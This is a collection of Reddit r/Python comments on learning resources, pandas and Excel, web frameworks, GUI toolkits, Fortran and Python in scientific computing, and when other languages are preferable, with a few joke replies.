My 0,02 cents: * https://github.com/alexandre/projects * http://www.ic.unicamp.br/~meidanis/courses/mc336/2006s2/funcional/L-99_Ninety-Nine_Lisp_Problems.html I've started to solve a part of this 99 problems using python: https://github.com/alexandre/99-python-problems [ ]'s (hugs)
You don't say a whole lot about what format the Excel file is in and types of analysis. If the data is mostly big chunks/matrices of data, then something like pandas is really going to be easiest to read in and analyze. If you are just using small portions of Excel files, then xlrd or some other Excel specific library would be best to pick out the pieces of data. The other piece of information is figuring out how big the dataset is. If you start getting into millions upon millions of rows of data you will need to think about a whole other set of considerations. If you want to see one small example, I did describe the basics of using pandas in a blog post - http://pbpython.com/excel-file-combine.html
I suspect so, but I don't know, I don't currently have access to a Windows machine. Give it at try and let us know!
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Magic square**](https://en.wikipedia.org/wiki/Magic%20square): [](#sfw) --- &gt;In [recreational mathematics](https://en.wikipedia.org/wiki/Recreational_mathematics), a __magic square__ is an arrangement of distinct numbers (i.e. each number is used once), usually [integers](https://en.wikipedia.org/wiki/Integer), in a [square](https://en.wikipedia.org/wiki/Square_(geometry\)) grid, where the numbers in each row, and in each column, and the numbers in the [main and secondary diagonals](https://en.wikipedia.org/wiki/Main_diagonal), all add up to the same number. A magic square has the same number of rows as it has columns, and in conventional math notation, "*n*" stands for the number of rows (and columns) it has. Thus, a magic square always contains *n*^2 numbers, and its size (the number of rows [and columns] it has) is described as being "of order *n*". A magic square that contains the integers from 1 to *n*^2 is called a *normal* magic square. (The term "magic square" is also sometimes used to refer to any of various types of [word squares](https://en.wikipedia.org/wiki/Word_square).) &gt;==== &gt;[**Image**](https://i.imgur.com/hwlbs5p.png) [^(i)](https://commons.wikimedia.org/wiki/File:Magicsquareexample.svg) --- ^Interesting: [^Antimagic ^square](https://en.wikipedia.org/wiki/Antimagic_square) ^| [^Magic ^constant](https://en.wikipedia.org/wiki/Magic_constant) ^| [^Most-perfect ^magic ^square](https://en.wikipedia.org/wiki/Most-perfect_magic_square) ^| [^Associative ^magic ^square](https://en.wikipedia.org/wiki/Associative_magic_square) ^Parent ^commenter ^can [^toggle ^NSFW](/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+conhg54) ^or[](#or) [^delete](/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+conhg54)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
 Why not just create a module at that point and import it. That's just a tougher more complicated way of doing the same idea. But yes I'm sure you could do that. Give it a try 
It's free to start. If you build something fun they'll give you more credit. Source: I worked there once upon a time.
Even the xml stuff is friendly. I've been doing a lot of work with passing xml by http requests to RESTful servers, and it works like a dream.
This needs to stop.
Stripe. Their API and documentation is top notch. Its fun to mess around with too.
what?
Without knowing how strong your python or Excel skills are, I'd recommend building up your Excel skills. I imagine they will expect a certain level of skill in Excel related to pivot tables, vlookups, array formulas etc. Anything you can do with python will probably be a plus but there may be a certain amount of hesitancy to start throwing a lot of python code into the mix. Good luck with the interview. It sounds like a great chance to learn a lot.
Take a look at /r/beginnerprojects! :)
I get the spirit of what you are saying which is... easy to use and see things happen where you can use python. I would suggest Mailgun. Send yourself emails based on triggers and suchlike. That's fun. Parsing Twitter streams is super fun. Scraping websites. There's just a zillion things you can do that have a gee-whiz glee to them once you get them to work. Autokey on Linux is about one of the coolest things ever invented on you realize you can script all of the aforementioned events and basically bend spacetime with a couple of pythonic lines when you log into your computer.
last.fm api is pretty cool, I remember spending one summer vacation messing with it. good times.
Where are you located? https://www.python.org/community/workshops/ and http://www.pycon.org/ list many of the Python conferences around the US and world.
A really simple answer is: 1. Go with Django (please people - don't bicker - it might not be the only answer but it's a damn good one and gets this chap moving) 2. If you need to find a library to cover stuff not in Django core then pick one from https://www.djangopackages.com/ that is active and popular. 
good idea, here is the link: https://docs.google.com/spreadsheets/d/1yXVFKiJMDJGPS6a6gaGn9qpIPNcgGetrLgfHGfdIm_U/edit?usp=sharing
There's been financial aid for the past 3 or 4 PyCons, and I don't think it's going away! Just mark your calendar for next October and apply for financial aid. It helped me go to Santa Clara two years ago and have ever been grateful for it.
You can just use pythons eval function. Basically set up the environment ( make your functions and load up all the necessary files) and then do something like. for line in file: eval(line)
As others have said the eval() function accomplishes what you're asking for. However, the better way to do what you're trying to do as I understand it is to put your functions in a .py file that you can download from server and import like this: import myfunctions myfunctions.function1(inputs) myfunctions.function2(inputs) # etc
Thanks for the reply! I will give it a go.
Hi there. You have posted a beginners question to /r/python, however it is far more suited to /r/learnpython, where users are actively interested in helping with beginner topics. Please resubmit it over there! Make sure to read their sidebar rules before posting, notably this one: "Posting homework assignments is not prohibited if you show that you tried to solve it yourself." Cheers &amp;amp; best of luck!
Start from here http://timgolden.me.uk/python/ or just straight to some example : http://timgolden.me.uk/python/win32_how_do_i.html
Directly from the PyCon website, more info here: https://us.pycon.org/2015/assistance/
Ex-PHP Programmer here.. The important thing you will need to keep in mind when using Python for web is that the process is not restarted for every request, like php. This results in somewhat different process when processing a web request. So there are two contexts of execution. One is when the server is started, and one when a request is being processed. So go step by step. Install something like Flask and simple two page app, and learn how variable scope works thoroughly. Spend at least two days playing with it. Even across multiple requests. This can save you a lot of trouble later. The 'restart at every request' model of PHP will be engraved in your brain so deeply that it can bite you hard later. So you ll have to erase that completely before doing advanced web stuff in python or any other language... Apart from that, this will be a breath of fresh air coming from something like PHP. There are better quality libraries for everything. The one thing you ll find lacking may be a built in counterpart for the DateTime object in Php. I think this was not implemented due the Timezone rules being so Inconsistent and it was not possible to make a lib that can consistently cover all cases.. And don't bother with Dependency Injection too much...at least for a while. Oh, I also suggest you start with Python 3.x..
Why is Excel involved in this at all? 
Thanks!
Sorry for the late reply, but I would suggest working on a simple project to get the feel for the functions and different patterns in OpenCV. Track different objects and manipulate the scene to your will, and then you shall master OpenCV. :)
Yep, it's a fork from Brad's project, which is a few years old and outdated. And haha @miker95 it is indeed my first script!
Because direct reports don't trust numbers unless they're in excel.
I totally agree with NBKTDIS's post and second the recommendation. The project you defined is something that could be thrown together in an afternoon once you learn the basic syntax. Good luck...
Haven't tried weasyprint (will have to look into it), but I've had great outcomes using an almost identical chain of jinja + [wkhtmltopdf](http://wkhtmltopdf.org/) (invoked via subprocess). 
I think there is a project called pweave which does something like this
Google. A pretty ridiculous amount of their functionality and data is exposed through APIs, and they're fairly Python-friendly. I once wrote a pretty quick script to format all the phone numbers in my GMail account, for example.
The easiest method would be to output actual python and have python (via py_compile) handle the translation to bytecode. If you're just generally interested in bytecode llvm IR is probably a more principaled starting point, otherwise grab a copy of `dis` and start experimenting.
Sweet, I'll check that out.
The main reason to avoid Python in a general-purpose setting is speed. Python is very slow to run compared to a compiled and ~~strongly~~ statically typed language like C/C++ or Java. Generally you're choosing between development speed and execution speed, and Python is very far on the development speed end of the spectrum. Any other reasons are generally domain specific. For instance, if I'm writing web middleware I'd probably use NodeJS. If I'm prototyping machine learning algorithms I might use MatLab. If I'm doing pure statistics I'll use R. If I'm writing a Windows GUI application I'll use C#/WPF. There are too many of these domains to enumerate. So maybe it would be better to say when to use Python: I would use Python if you're writing scripts that have limited responsibility and high turnover, meaning they'll change fairly often and don't need to be particularly efficient. I would also use Python for prototyping, especially in a scientific computing setting. If your needs don't fall into these areas then there is probably something better out there. TL;DR: Python is good when dev speed is significantly more important than execution speed.
When i am doing data processing and plotting. Here i guess R holds a slight edge currently. For data processing the ability to constantly view the transformations to the tables an IDE like Rstudio comes quite handly. I know Ipython exists but still it doesnt come up to the same level. Also in case of plotting i ggplot and other libraries in R are more flexible and easier to deal with than matplotlib. The focus of R on being a language focussed for data processing gives it the slight edge.
That really depends on the context. I work in scientific computing (heavy numerical simulations for astrophysics), and most of my codebase is in Fortran. In my field there are a few codes in C++, some codes in C, and a lot of codes in Fortran. So yeah, C/C++ and Java are probably common in the industry, but a lot of academics use F90 on a daily basis. Of course, I use python for (most of) the simulation analysis, and 100% of the plotting and visualisation, but still.
&gt; C#: Anything with a windows GUI. IronPython
I heard quite a lot of complaints also. Although I've had several people say the last couple of versions (2003/2008) were actually pretty good. I'm not convinced. I think C/C++ are better choices. Edit: Python extensibility with C is a pretty good reason to learn C.
We are still relying on Latex (via popen) to create PDFs form our webapp. It is terrible to test and prone to failure, but I have not found anything else that gives me as much control about the looks of the resulting PDF as we need. Maybe I should look into weasyprint.
As you get closer to supercomputers you see more of Fortran and less of Java (if at all).
Aye, I may combine this with classes to get a more structured and robust idea but I've come to agree that simply importing as a module makes it a lot easier.
Hi there. You have posted a beginners question to /r/python, however it is far more suited to /r/learnpython, where users are actively interested in helping with beginner topics. Please resubmit it over there! Make sure to read their sidebar rules before posting, notably this one: "Posting homework assignments is not prohibited if you show that you tried to solve it yourself." Cheers &amp;amp; best of luck!
PyQt and PySide are alternative options to using Wx for Python GUIs. The bindings can be a little clumsy at times, but using Qt Designer and the Qt action decorators, it's as passable as Qt is anyway.
Or just use PySide/PyQt and get cross-platform GUIs straight away.
the content of cell_value seems to be simply a float. Thats what the subscriptable error says. You cant access an index of a float. 
I don't do web, so for me only in cases when I can't have any compromises with performance. For other stuff Python is simply the best: this also includes parallelism, but I may be lucky to have only embarassingly parallel problems (on backend most of parallelism is "easy", as Linus pointed out recently). Regarding performance: pypy is great. Give it a shot, if you haven't already.
when a simple bash script is enough to get the job done.
The way I would do it is to parse the language, build a syntax tree, translate the tree to AST and compile that. It's kind of complicated, but you can look at hylang for an example on how to do that. If not, just try to play with the AST to get a hang of it and then continue with your project.
Take a look at [enaml](https://github.com/nucleic/enaml) which is a extends python with a declarative DSL for developing GUI's. Its performs databinding through tweaking [the python bytecode](https://github.com/nucleic/enaml/blob/master/enaml/core/enamldef_compiler.py). Its an amazingly well engineered project IMO, so that might be an interesting code base to delve into
Unfortunately pypy is useless for scientific computing because it doesn't support numpy. If you can get your code to run with [numba](http://numba.pydata.org/), however, that gives pretty awesome speed gains. I've set up this silly example: from __future__ import absolute_import, division, print_function, unicode_literals from numba import jit from time import time from math import sin #@jit def f(n): sum = 0 for i in range(n): for j in range(n): sum += sin(i*j) print(sum) t1=time() f(10000) t2=time() print('elapsed: %0.3f' % (t2-t1)) f(10000) t3=time() print('elapsed: %0.3f' % (t3-t2)) This takes 24.1s and 24.6s on my tired old laptop with the @jit decorator commented out. With the jit enabled it is a somewhat faster 4.13s and 4.06s. If I leave out the sin() call, with the jit it runs in 0.051s and then 0.000s which I'm going to interpret that the JIT optimizes the loops away completely. Now if only my much more pythonic actual production code were supported, or if the error reporting would show me exactly *why* it isn't...
I understand that Python /is/ a strongly typed language. Whereas in your comment, you elude to it being opposite to C, in that it is neither compiled, nor strongly typed. The differentiator in typing is Python's dynamic typing vs. C's static typing system.
Well, I was just relating my personal use cases. I'm sure there are a bunch of other examples of things that Python does poorly (eg. anything where duck typing becomes a liability).
I am an interested person, so I like to try all sorts of things. I use python when I want to get stuff done. I use almost anything else for when I want to experiment.
I don't know what I'm missing but the PySide tutorial docs don't appear to contain any actual Python code.
Wow, that is pretty sweet. I might try see what other ways I could clean up my phone book with their api sometime. It is synced to a couple different things and it is really fucked up and unorganized.
Don't map, reduce, and filter come from Lisp? 
I regularly use on the command line... &gt; perl -ple 's/&lt;complex regex with capture groups&gt;/$3$2$1/g' 
from dreams import wet
Thanks a bunch for this, Django was on my goto list for just getting started and jumping in. Glad to see it's recommended by some, I'll give it a shot!
This is unbelievably helpful. Thanks so much, this is what I meant when looking at the ecosystem. My main concerns are things like with PHP, I know that in-order to have all my package dependancies be portable with Composer I use a composer.json file in each project root. Going to Python opens a lot of questions like what files do good developers expect to be in any good project. I know of requirements.txt for example, but I could do with seeing Github repositories of projects that people consider 'done right' so I can get to grips with how all that is supposed to work. This is a great start though, thanks a bunch!
These are my non-python use cases: * I use R for exploratory data analysis as well as statistical testing * I use C++ for image processing and AI as these require top performance * I use the shell for simple work with the filesystem, although I tend to use python more and more for this task * Javascript in the browser
I'll just throw out [jitpy](http://jitpy.readthedocs.org/en/latest/) here. It deserves to be better-known.
Weirdly everything in the Maths department is Java, but in Physics it's all Fortran and Python.
&gt; everything in the Maths department is Java I can't think of a good reason for that.
I use R for most statistical work. 
I was writing a custom multi-target tracking system with shape recognition for 4K video that required the use of multithreading to speed things up, something the GIL in Python makes difficult. Now I've got the resulting CSV files I'm enjoying being about to get back into Python, NumPy, Pandas and Matplotlib. 
[I'm not sure where you were looking.](http://qt-project.org/wiki/Hello-World-in-PySide)
thanks for the explanation, it is always good to learn new things. for the first part I had to correct a typo, I meant 0.0 to 1.0, I had made some tests with a method like this: img = [] enhancer = ImageEnhance.Brightness(pilImage) for i in range(0,100): pilImage=Image.open(inputImage) ppilImage = enhancer.enhance(i/100.0) img.append(ppilImage) for y in range(0,10): for x in range(0,10): out.paste(img[(y*10) + x], (width*x,height*y)) out.save(outputImage) and I noticed that the second decimal place was ignored, in fact I could not use 0.55 or 0.72, but only 0.1 0.2 0.3 etc. but now redoing the same test I got a different result http://i.imgur.com/pTtFKHF.jpg now i have 100 shades. i have no idea why
&gt; Object-oriented prototyping. I'm curious here.. For me it always feel the other way around, that Java's oo is a bit cumbersome and hard to work with compared to python. What do you find easier / better with java compared to python in that case?
For any kind of large scale data management. e.g. Python is no replacement for a proper SQL database.
Flask is also great and it's small and simple - but you will find that the extra time spent learning Django pays off for most sites. It hits the sweet spot of features vs complexity for 90% of use cases.
Here's the PySide documentation page: http://pyside.github.io/docs/pyside/ Down the bottom is a link to tutorials: http://pyside.github.io/docs/pyside/tutorials/index.html Here's the first one: http://pyside.github.io/docs/pyside/tutorials/qmltutorial/step1.html No Python in sight. Thanks for the link but I'm not heartily encouraged by a project that can't manage its own documentation. I think it's part of a wider problem that the Python community has always suffered from, which is that it tends to assume you are happy with everything being a port or a re-working of something in another language. Even the basic Python 2 tutorial is filled with these assumptions. 
Yeah, bash infuriates me sometimes. It seems to require mandatory spaces in places most languages don't, so I never remember to add them.
Python is compiled in almost exactly the same way that Java is.
Go really is a dream for that, but I've personally worked in a team that horizontally scaled a Python web app to over 250,000 database-backed requests per second, sustained.
When I'm making an app for iOS or Android.
by database-requests can you be more specific? ex: redis get,set ? or rdbms select ?
&gt; I work with scientific software every day and not once have I seen a release in Fortran. Ever heard of this thing called LAPACK or ever wonder why Matlab arrays are 1-indexed?
I have a friend who has done lots of numerical simulation work in Fortran/C++ for space applications (think satellite launchers, etc.). He's currently out of a job, do you have any open positions? :-)
We used Couchbase, MongoDB, Redis, and Cassandra, but each for different things. Cassandra is astoundingly good for ingest: "here's 5 million inserts, please". Redis has O(1) heap queries. Couchbase was great for quick lookups on mostly static data. I forget why we had MongoDB.
Then your world view is very limited! There are lots of excellent Libs around the JVM ecosystem. On top of that there are good frameworks for distributed computing. Beware that it must not be Java - think of Clojure e.g. - or even Python (→ Jython).
AFAIK, there're no optimizations done when compiling Python code to its bytecode representation. Java's bytecode, on the other hand, is quite a different beast.
&gt; distributed computing People use faster languages for that. &gt; it must not be Java So why do you bring it up? They said Java, not JVM. * * * My guess is those people use Java because of reasons that are not technical and they could use anything instead just as well.
You're right, I was only speaking for CPython which is the default implementation.
CPython bytecode speeds up load time but not run time (after the code has fully loaded).
Fortran was annoying as hell. At uni we had to model the crank-nicolson equation in fortran and plot the output in whatever (we chose excel) Ended up doing it in Madlab and porting it over to fortran over a long session of Redbull. 
Can you elaborate more? I thought python would do decent in modern web architecture especially those using microservices to enable high concurrency since io isn't as heavily impacted by GIL.
When I'm outside getting some exercise. (Not often)
&gt; I forget why we had MongoDB. Otherwise you wouldn't have been webscale! *watches for some drums and a cymbal falling of a cliff*
Reading up on that later. Thanks. 
As a Game dev, I tend to divide Game Logic into two categories. Game Logistics, and Math. And try to divide the code as much as I can into the two, so Game Logistic objects call on math objects to do math. Then I take the math object and transform them with Cython into C extensions. That's the theory anyway. 
Would Tornado work for that?
if any of these are true, i'll use bash: * at most one screenful of code * calling lots of subprocesses - python support is good, but bash is really concise * doing not-so-portable stuff like closing inherited file descriptors * continuing after errors (exceptions are great until they derail a boot sequence) edit: formatting 
Haha madlab.
From pervy.gross import inappropriate From __future__ import felony
Are you using OpenCV or some other library written in C/C++ for this as part of your script?
javac purposely keeps its bytecode simple so the jit compiler can optimise it
Eve certainly uses Python on both sides for the main loop and the general logic, but much of that is only possible due to a lot being written in C (or C++, not sure) in the form of Python extensions. I myself have used Python for server-side game development where it can work well if you plan for a multi-process system from the start. I still wouldn't touch it on the client side, though.
Totally agree here. Dude said he is just now learning the intricacies of python. Perhaps he hasn't gotten much into class design yet?
I use it indirectly because I use scipy.
 - Java when it's big and enterprisey (I'm still a strongly-typed language guy at heart); or Androidy - C/C++ when performance really matters (multithreaded socket servers, say), or when I'm writing bare-bones for embdedded devices (which I suppose is just "performance" in different units); or for cross-platform Qt work (Qt really does make C++ a delight). - Python for scientific/statistics or lower-end web sites, or back-of-the-envelope quick scripts. Plus django. - JavaScript because I have to -- if only Python had been that bit more mature when they were picking a web scripting language. Ubiquitous python in the browser would have been truly great. Python, for me, is the jack-of-all trades that is good enough at everything to make it great for fast prototypes or for testing some random bespoke serial protocol from a PC. I wouldn't say any of them is better than the other in the same way a hammer is not better than a screwdriver. I feel I'm missing a functional language from my toolkit, but that's quite a learning curve to climb... it's on the todo list; but in the meantime, Python let's you dip your toes without going the full haskell :-)
It's not really just a script, rather a large real-time application. The 2D detection is OpenCV, the multi-camera 3D estimation, data association and EKF is in Python/Numpy. There is one tight loop in cython. The data-model is numpy arrays. All supporting code is python too. Language is never the largest determining factor in speed, architecure is. If you architect your python application correctly, it can be fast.
Nope, I think that's its true name.
&gt; cross-platform Qt work Have you looked at PyQt? How does it compare? I'm trying to decide if I want to write something in Python or C++ that will use Qt. I've never done a GUI before (besides some GTK for classes), so it's up in the air.
How were their data stored then?
Sort of off-topic, but I have noticed that much of the scientific computing community refers to "codes" instead of programs or scripts and I haven't really seen that anywhere else and it sounds a bit off to me. Do you know why this difference exists?
Oh god, CINT, ROOT and friends. I steered well clear of that mess. Pretty sure they're all well pleased with it too. And knowing the general quality of physics code it wouldn't surprise me if it didn't actually run that fast (except maybe for the bit build by some russian genius that no one else understands :P ). 
I'm not sure I understand this. Do you mean using server side JavaScript (like Node). How does one use Python "in the browser"? Edit: I misinterpreted the question as "when does one choose not to use Python"
One doesn't.
This is funny since I just took on 2 programming tasks this week where I chose python for one and an excel sheet for the other. The one where I chose python was low on data, heavy on search. The task I solved with a spreadsheet was heavy on data, low on search. The benefit of a spreadsheet is that it combines data entry with functionality in a much more accessible way then a python script would (esp. to non techies).
Actually, I'd argue Python's pretty bad at concurrency too. It's only relatively recently that there's been anything approaching a standard for handling it (ie. asyncio) and anybody that is using concurrency as a way to get parallelism (which is a major reason for concurrent design, really) is obviously still mostly screwed.
These days I/O is speeding up faster than individual CPU cores are. So the network bottleneck is likely to be decreasing in relative terms, putting any single processor web server at a disadvantage.
https://docs.python.org/3/library/string.html#format-specification-mini-language &gt; The ',' option signals the use of a comma for a thousands separator. For a locale aware separator, use the 'n' integer presentation type instead. &gt;&gt;&gt; format(1234.56, "n") '1.234,56'
One doesn't. The question was, "when do you NOT use Python". (Caveat: I'm sure there are some quirky cross-compilers out there. But it's unlikely to be worth the bother to use them.)
Yes, lisp might implemented it before, but Haskell that takes it to extreme. 
Well, in theory you can, there have been a couple of projects. The one that is the most interesting is [Brython](http://www.brython.info). Not saying I think this is actually an idea that is ready for prime time particularly. Just saying in theory one can.
&gt; Why don't they come pre-installed? I am completely new to python. These are not dependencies of python itself, just of specific programs that you might create or (for something like pyinstaller which packages python code) dependencies of other parts of a build process. Python doesn't include them because there are a *lot* of different things you might want, so it wouldn't be space efficient to provide them all. That's just an immediate practical problem, it's also not clear if it would be desirable, since these things are developed independently and so it would be difficult to distribute correct (and compatible) versions in some monolithic package, and to update them later. There are multiple different package systems intended to resolve this problem conveniently by making it easy to obtain and install external dependencies, and in some cases packaging extra modules by default. Python itself has pip, but there are also tools like conda and its associated scientific distribution fulfilling a similar role with some different advantages and disadvantages.
I tried PyQt a few years ago. It's pretty good -- and probably what I would reach for if I wanted a non-web UI for a python app. However, I feel it loses something in the translation. I think the lack of strong typing and garbage-collected memory management in Python is doesn't quite mesh as smoothly with Qt as does C++. That's just my IMHO though -- please, gentle readers, don't take that as me stating it as a fact and downvote me into oblivion. As for first time making a GUI... difficult to answer, I would guess your experience in the base language will be more relevant. However, the Qt documentation is native C++, so you might bear that in mind when learning. If you know both Python and C++, I'd suggest do C++ Qt first, just so that you've seen the raw interface (which PtQt will be building on too). Certainly in terms of "what GUI", I can't recommend Qt highly enough. It's (to my mind) a beautifully designed library, one of the best I've ever used. Care has really been taken in making it consistent, predictable and well featured. It's all round "pleasant" in a way that my brief dealings with Gtk weren't. The only hump you have to get over is the "moc" stuff (and possibly `qmake`), but once you see that that's just a convenience for auto-writing the class meta-information, you forget it even exists. I've never tried, but possible `cmake` would be a nicer tool than `qmake`, and will have broader use anyway.
/r/learnpython would be better for this sort of question http://www.reddit.com/r/Python/comments/2voohz/homework_learning_and_posts_on_rpython/ 
Thanks for the really detailed answer. You andwered sll of my questions! Does that mean that puthon didn't develop these addons? They are 3rd party software addons?
Silly example, but we have a process to consolidate and report on data in hundreds of CSVs.. Ofc we use pandas for all the heavy lifting.. but.. consolidating the files into the one monolithic sheet to process (which is about 5GB) was taking like 20 minutes and blowing out the memory on the server running it.. tail -n +2 and concatanate them all together was like 20x faster and a tiny memory footprint. Sometimes old school tools are still better. 
Since we were discussing programming languages in a technical subreddit I assume the person above meant Java when they said Java. So I'm going to set aside the JVM part of the discussion. For dispatching, it sorta doesn't matter which language you use. Also it might very well be they don't do that kind of thing at all. As for computations per se, I can see three options in mathematics: 1. The computation involves really heavy number crunching (double check, is it really math?). 2. The computation involves a bit of number crunching. 3. The computation is mostly symbolic. So 1. and 3. more or less exclude Java. 2. doesn't, but there are better options. tl;dr: if you are in math, either Mathematica or SciPy will serve most if not all of your tasks better than Java.
Right now my boss keeps telling people that we do "big data" (I'm ~~an~~ in academia). Except that the database is ~10GB, receives updates 3 times a year (and is otherwise static), and there is no real time on demand need to view this data (well there is but guess who never has time to implement it!). I asked him not to tell people that we "do big data" and he responded poorly. edit: if you are familiar with the 4 V's (volume, velocity, variety, veracity) we do none of them. I think its because its web data my boss thinks its "big data".
Wow you're a legend. Cheers!
Check out web2py if you want that same feel but in python.
That really doesn't surprise me. The one thing worse than developing a cruddy convoluted system is being smugly superior about it. 
I think every engineering and science undergrad should be forced to go through a clockwork-orange style conditioning where the words "I WILL NOT INVENT MY OWN DATA FORMAT" are seared permanently into their brains. Then they should take a course on SQL.
Yep, same here. I don't even deny that Bash would be a better choice in some of those cases... I just freaking *loathe* Bash.
SQL is not an end all, be all solution though. I do agree with you in principle, but not in methodology. A better deterrent would be giving them some random fucked up format they have to reverse engineer. Conditioning through suffering as I like to call it. There are too many widely used and matured serialization formats for people to be running around inventing their own. 
Pandas, statsmodels, and scikitlearn offer a good framework in python that is an alternative to R.
Ha ha, well I am biased and I certainly could be wrong but Ruby has what appears to me to be a fuller featured (and older/more stable) set of tools like pry, byebug, several unit test frameworks. Also, I know this will probably be met with a flurry of downvotes on this subreddit but I much prefer rubygems + bundler over virtualenv.
&gt; If the work is building a web-app of some sort (it just comes up short against the competition) What competition? What are the cons of using Python compared to the pros of using the competition?
Thanks, I'll check it out!
How big are these files out of interest?
I have given a good reason: You can easily integrate into the JVM ecosystem with all its powerfull toolsets and frameworks around distributed compotation. You wont do numbercrunching on a single machine, right ;-) And for dispatching it **does** matter, which language you use, because with some you have no access to powerfull frameworks (again!).
You should look into Cython. You can often get C level performance out of Cython but it's still massively more readable than C or fortran.
Pandas Pandas Pandas Pandas Pandas Pandas Pandas Pandas Pandas Pandas Pandas Pandas Or if it's really simple, use openpyxl instead. But seriously, just use pandas.
The a look at CPython/PyPy source code. Use the dis module to inspect bytecode of Python code. Once you understand it, which is fairly simple creating bytecode should be simple.
Smallest one I tested with today was 50 MB, then an intermediate one with 4 GB and the biggest one being something around 92 GB... 
When I'm processor-bound. Then there's something else that will do a better job.
When bash is easier, when I need something faster (C), or I'm dealing with web (JS). I know I can use Python for web.... I just don't like to. And sometimes it's not practical (clientside).
once you recognize the reason it becomes rather obvious. I assume you are complaining about shit like `if_[_x_=_y_]` here. Here's the thing, `[ x = y ]` is not a fancy square bracket around the logical expression you see in other general purpose languages. It's literally a command '[' with params 'x' '=' 'y' and closing token ']' ( and pretty much an alias for `test` command eg test x = y) You can literally call it that way, with all these quotes $ if '[' '1' '=' '1' ']'; then echo true; else echo false; fi true bash recognizes commands and assignments, that's it. Commands require delimited params (commandparam1param2param3 won't work, will it), assignments are recognized when there is a continuous 'word' with = inside, otherwise it would be totally ambiguous. x=a # assignment x = a # call command 'x' with params '=', 'a' x= a # call command 'a' with env var x set locally to null
You tried to load a huge csv into memory... and it used large amounts of memory? Try generators next time. David Beasley has multiple great tutorials on generators and coroutines if you're interested. It's easy to follow because 1) he's an excellent educator and 2) he reimplements common Linux tools. IIRC he writes a few generator expressions that beat `awk` in terms of performance (Though it's probably not a fair representation of `awk`. Still impressive, I think.). Edit: the relevant slides start at page 20 [in this PDF](http://dabeaz.com/generators/Generators.pdf). Take a look at his "generators: the final frontier" talk though. It's really entertaining.
I suppose in the developer's case it might be the best part.
 IndexError: You're not 15 anymore, sorry
Personally, I find Go's built in net/http and html/template packages to be far superior to any of the Python frameworks I've tried. The Python frameworks just try to do too much for me, and I end up with code scattered across 8 different files in a convoluted directory structure that is unique to this particular framework. I don't care for most of the templating systems in Python, and again find html/template to be better (Oh god, includes are so much easier than extends'). I guess for me it's not necessarily that I find Python's unusable, it's just that I find other languages handling of HTML/HTTP to be better. I've also spent much less time working with web frameworks in Python, because the complexity has always driven me away from learning them after a couple of hours so that might be related. Perhaps it's not as bad once you're used to it.
Using f2py to import Fortran subroutines as python functions can literally speed your code up 20x if you have big arrays it's awesome
Are you familiar with profiling? https://docs.python.org/2/library/profile.html If you profile each function, it will hopefully be obvious where that extra time is being spent.
TL;DR: Go and Erlang provide better solutions with very few compromises. Nearly everything beats Python for performance. A lot of the cons roll with ones I listed. Too slow, too hard to make do stuff concurrently, etc. But additionally, the libraries for building python web stacks tend to be at extremes, either way too simplistic or way too overwhelming. It is a bit of a three bears situation... Flask is too simple, Django is too much... Twisted is too callbacky... Tornado is too seperate... Bottle is too... As for the competition, pick almost anything (excluding rails) and you will find significant improvements IMHO: grizzly (Java), beego (Go), http-kit (Clojure), elli (Erlang), http-sharp (C#), express (Node.js), wai (Haskell), lapis (Lua), jester (Nim)... 
I've slowly moved in this direction for all but the simplest tasks. Every time I say something is simple enough for bash, my subconscious gives me a little prod as if to remind me that only pain waits down that road.
Actually, try not to *omit* this line, but to load these variables from external variables (like environment variables). For instance, you could use [python-decouple](https://pypi.python.org/pypi/python-decouple/2.3) and have all the sensitive data in a file called `.env` that is properly ignored from your git (I mean, add `.env` to the `.gitignore` so it never goes to the server or GitHub). Than you use the package to load variables from `.env` into your `settings.py`: from decouple import config SECRET_KEY = config('SECRET_KEY', default='secret key') It will look for the `SECRET_KEY` variable in the `.env` file and use it. If it is not found, you just set a default value. In the server you can pass this variable as a environment variable. Thus, you should use it for: secret key, private API, data base and server credentials etc.
Python not worth knowing but BASIC is? What a bunch of clowns. And how many physicists code in assembler these days?
beats Windows bat scripting.
Or possibly ruby. Ruby is danged excellent at pushing text back and forth to the shell and doing some munging on it in-between.
Right, I have actually profiled a function a few months ago but didn't think of it right now... I am definitely going to do that and will give some feedback once I got results in case someone else stumbles upon a similar problem. ^^
I have to admit I still use Matlab every now and then when I need to do some number crunching as quick and dirty as possible. I'm not really a programmer and it was the first language I was taught and it still is the one I know the best (although I have been using Python on a daily basis for around a year now). Apart from that, R when exchanging code with my colleague (but I hate it), that Excel VBA stuff that I never really understood when exchanging code with another colleague, and sometimes Mathematica when I don't trust my own mathematical skills.
Well, I stared playing with it the day before yesterday and I am running on arch with the python3 development version from aur... And it has been pretty consistent. I really like the fact that I can configure it in python with all it's neat little tricks and syntactic sugar.. However I couldn't really figure out how to actually run it on two monitors so I will have to take a look at that when I find the time. But it has been fun and stable as well as productive.
I use C++ over python in performance/memory critical applications such as simulation code. 
When the app is already written in another language, or the team has proficiency with another language.
You mean like h4, hdf, and h5 (i know h5 and h4 are hdf formats but somehow the hdf tool in our version of idl doesn't support either h5 or h4 somehow...) I still haven't figured out that format, i'll delete stuff, compress stuff, and the dataset becomes 4 times larger yet emptier. The 3rd party software I have to pull our interferogram images from just needs to save a 1024x1024 byte array yet somehow takes up &gt;25 MB per array. Sometimes I actually dream about the day I'll convince the big boss man to tell them to fuck off and letme just wrap the acquisition into my code as well.
Here you go: http://pythonprogramming.net/, should keep you occupied for a while. If you aren't satisfied or find yourself lusting for something else, feel free to make a suggestion. 
 From __future__ import You forgot to escape characters. 
wish i had one
Have you tried Flask? It pretty much just gives you request, response, templating, sessions and a handful of helper functions (reverse lookup, sending files to the browser, json response builder, a few others). There's also blueprints which are like logical groupings of related endpoints (not really the same as Django's applications but kinda). Might be worth checking out if you're interested in Python webdev still.
Apparently BASIC is used to program some embedded systems DAQs. But yes, there was plenty of clowning going on. I feel like physicists like to think they could write in assembly if they wanted to. The number of physicists I know who think they can get a senior developer job and "figure out" the language after being hired is high.
I'm familiar enough with C++ that I don't want to deal with it at all when I retreat to the safety of Python code. ;)
